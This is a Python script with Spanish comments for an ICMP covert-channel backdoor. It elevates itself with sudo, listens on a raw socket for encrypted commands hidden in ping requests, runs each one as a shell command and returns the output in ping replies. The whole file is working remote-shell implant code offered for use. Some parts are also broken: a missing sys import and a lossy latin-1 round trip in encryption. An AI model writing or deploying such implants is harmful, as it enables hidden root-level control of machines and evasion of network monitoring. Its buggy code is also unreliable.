import socket
import struct
import subprocess
import hashlib
import zlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import logging
from concurrent.futures import ThreadPoolExecutor
import os
# Verificar y relanzar con sudo si es necesario
def check_sudo():
    if os.geteuid() != 0:
        print("[S] Este script necesita permisos de superusuario. Relanzando con sudo...")
        args = ['sudo', sys.executable] + sys.argv
        os.execvpe('sudo', args, os.environ)

check_sudo()
def decrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return unpad(cipher.decrypt(data), AES.block_size)

def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(data.encode(), AES.block_size))

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "Comando excedió el tiempo límite de 5 segundos"
    except Exception as e:
        return f"Error al ejecutar el comando: {str(e)}"

def send_icmp_reply(sock, addr, data, key):
    packet_id = os.getpid() & 0xFFFF
    
    # Comprimir y encriptar los datos
    compressed_data = zlib.compress(data.encode())
    encrypted_data = encrypt_data(compressed_data.decode('latin-1'), key)
    
    # Crear el encabezado del ICMP Echo Reply (tipo 0)
    header = struct.pack('bbHHh', 0, 0, 0, packet_id, 1)
    my_checksum = checksum(header + encrypted_data)
    header = struct.pack('bbHHh', 0, 0, socket.htons(my_checksum), packet_id, 1)
    packet = header + encrypted_data
    
    try:
        sock.sendto(packet, addr)
        logging.info(f"Respuesta ICMP enviada a {addr[0]}")
    except socket.error as e:
        logging.error(f"Error al enviar el paquete de respuesta: {str(e)}")

def checksum(source_string):
    sum = 0
    count_to = (len(source_string) // 2) * 2
    for count in range(0, count_to, 2):
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
    if count_to < len(source_string):
        sum = sum + source_string[-1]
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def handle_packet(packet, addr, key, sock):
    icmp_header = packet[20:28]
    icmp_type, code, checksum, packet_id, sequence = struct.unpack('bbHHh', icmp_header)
    if icmp_type == 8:  # ICMP echo request
        encrypted_data = packet[28:]
        try:
            decrypted_data = decrypt_data(encrypted_data, key)
            decompressed_data = zlib.decompress(decrypted_data)
            data = decompressed_data.decode().strip()
            logging.info(f"Comando recibido de {addr[0]}: {data}")
            
            if data.lower() == 'exit':
                logging.info("Comando de salida recibido. Cerrando el servidor...")
                return False
            
            result = execute_command(data)
            logging.info(f"Resultado: {result}")
            
            # Enviar respuesta al cliente
            send_icmp_reply(sock, addr, result, key)
        except Exception as e:
            logging.error(f"Error al procesar el paquete: {str(e)}")
    return True

def listen_for_icmp(interface, key):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        logging.error("Error: Este script requiere privilegios de administrador.")
        return

    if interface:
        sock.bind((interface, 0))

    logging.info(f"Servidor ICMP en ejecución{' en ' + interface if interface else ''}...")
    logging.info("Presione Ctrl+C para salir.")

    with ThreadPoolExecutor(max_workers=5) as executor:
        try:
            while True:
                logging.info("Esperando paquetes ICMP...")
                packet, addr = sock.recvfrom(1024)  # Aquí esperas por un paquete ICMP
                logging.info(f"Paquete recibido de {addr[0]}")
                # Enviar tarea al pool de hilos sin bloquear
                executor.submit(handle_packet, packet, addr, key, sock)
        except KeyboardInterrupt:
            logging.info("\nServidor terminado por el usuario.")
        finally:
            sock.close()

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Servidor ICMP para recibir y ejecutar comandos.')
    parser.add_argument('-i', '--interface', help='Interfaz de red para escuchar')
    parser.add_argument('-p', '--password', required=True, help='Contraseña para desencriptar los datos')
    parser.add_argument('-l', '--log', default='icmp_server.log', help='Archivo de log')
    args = parser.parse_args()

    logging.basicConfig(filename=args.log, level=logging.INFO, 
                        format='%(asctime)s - %(levelname)s - %(message)s')

    key = hashlib.sha256(args.password.encode()).digest()

    listen_for_icmp(args.interface, key)

if __name__ == "__main__":
    main()
